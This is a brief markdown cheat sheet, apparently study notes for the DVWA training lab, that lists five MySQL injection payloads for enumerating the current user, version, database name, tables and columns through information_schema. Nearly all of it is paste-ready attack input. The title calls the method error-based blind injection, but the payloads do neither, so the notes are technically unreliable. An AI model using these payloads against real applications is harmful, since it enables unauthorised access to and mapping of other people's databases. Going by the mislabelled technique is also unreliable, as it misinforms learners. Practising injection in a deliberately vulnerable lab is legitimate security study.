# Error-Based Blind Query SQL Injection

Search Tag(s): #blind-sql-injection #dvwa

TODO: Prepare with enumeration

1. Extract the current user:

```sql
' OR IF(1=1, (SELECT user()), 0)#
```

2. Extract the database version:

```sql
' OR IF(1=1, (SELECT @@version), 0)#
```

3. Extract the current database name:

```sql
' OR IF(1=1, (SELECT database()), 0)#
```

4. Extract tables from the current database:

```sql
' OR IF(1=1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0)#
```

5. Extract columns from a specific table:

```sql
' OR IF(1=1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='<table_name>'), 0)#
```

---
## References

- [SQL Injection (Blind) [DVWA]](https://www.linkedin.com/pulse/sql-injection-blind-dvwa-nguyen-nguyen/)

- [Blind SQL Injection: An Expert’s Guide to Detect and Exploit](https://www.stationx.net/blind-sql-injection/)